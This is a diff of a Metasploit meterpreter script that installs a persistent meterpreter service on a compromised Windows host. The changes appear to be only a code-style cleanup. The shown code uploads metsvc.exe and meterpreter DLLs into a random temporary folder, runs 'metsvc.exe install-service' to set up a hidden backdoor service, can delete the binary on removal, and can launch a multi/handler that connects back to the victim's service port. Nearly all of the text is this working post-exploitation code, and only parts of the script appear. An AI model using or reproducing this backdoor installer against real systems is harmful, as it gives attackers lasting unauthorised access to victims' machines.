@@ -1,10 +1,9 @@
+# frozen_string_literal: true
 ##
 # WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
 # If you'd like to imporve this script, please try to port it as a post
 # module instead. Thank you.
 ##
-
-
 
 #
 # Meterpreter script for installing the meterpreter service
@@ -23,9 +22,9 @@ opts = Rex::Parser::Arguments.new(
 
 # Exec a command and return the results
 def m_exec(session, cmd)
-  r = session.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true})
+  r = session.sys.process.execute(cmd, nil, 'Hidden' => true, 'Channelized' => true)
   b = ""
-  while(d = r.channel.read)
+  while (d = r.channel.read)
     b << d
   end
   r.channel.close
@@ -47,7 +46,7 @@ if client.platform =~ /win32|win64/
   #
   # Option parsing
   #
-  opts.parse(args) do |opt, idx, val|
+  opts.parse(args) do |opt, _idx, _val|
     case opt
     when "-h"
       print_line(opts.usage)
@@ -63,7 +62,7 @@ if client.platform =~ /win32|win64/
   # Create the persistent VBS
   #
 
-  if(not remove)
+  if !remove
     print_status("Creating a meterpreter service on port #{rport}")
   else
     print_status("Removing the existing Meterpreter service")
@@ -73,7 +72,7 @@ if client.platform =~ /win32|win64/
   # Upload to the filesystem
   #
 
-  tempdir = client.fs.file.expand_path("%TEMP%") + "\\" + Rex::Text.rand_text_alpha(rand(8)+8)
+  tempdir = client.fs.file.expand_path("%TEMP%") + "\\" + Rex::Text.rand_text_alpha(rand(8) + 8)
 
   print_status("Creating a temporary installation directory #{tempdir}...")
   client.fs.dir.mkdir(tempdir)
@@ -88,11 +87,11 @@ if client.platform =~ /win32|win64/
   }
 
   bins.each do |from, to|
-    next if (from != "metsvc.exe" and remove)
+    next if (from != "metsvc.exe") && remove
     to ||= from
     print_status(" >> Uploading #{from}...")
     fd = client.fs.file.new(tempdir + "\\" + to, "wb")
-    path = (from == 'metsrv.x86.dll') ? MetasploitPayloads.meterpreter_path('metsrv','x86.dll') : File.join(based, from)
+    path = from == 'metsrv.x86.dll' ? MetasploitPayloads.meterpreter_path('metsrv', 'x86.dll') : File.join(based, from)
     fd.write(::File.read(path, ::File.size(path)))
     fd.close
   end
@@ -100,7 +99,7 @@ if client.platform =~ /win32|win64/
   #
   # Execute the agent
   #
-  if(not remove)
+  if !remove
     print_status("Starting the service...")
     client.fs.dir.chdir(tempdir)
     data = m_exec(client, "metsvc.exe install-service")
@@ -112,14 +111,12 @@ if client.platform =~ /win32|win64/
     print_line("\t#{data}")
   end
 
-  if(remove)
-    m_exec(client, "cmd.exe /c del metsvc.exe")
-  end
+  m_exec(client, "cmd.exe /c del metsvc.exe") if remove
 
   #
   # Setup the exploit/multi/handler if requested
   #
-  if(autoconn)
+  if autoconn
     print_status("Trying to connect to the Meterpreter service at #{client.session_host}:#{rport}...")
     mul = client.framework.exploits.create("multi/handler")
     mul.datastore['WORKSPACE'] = client.workspace
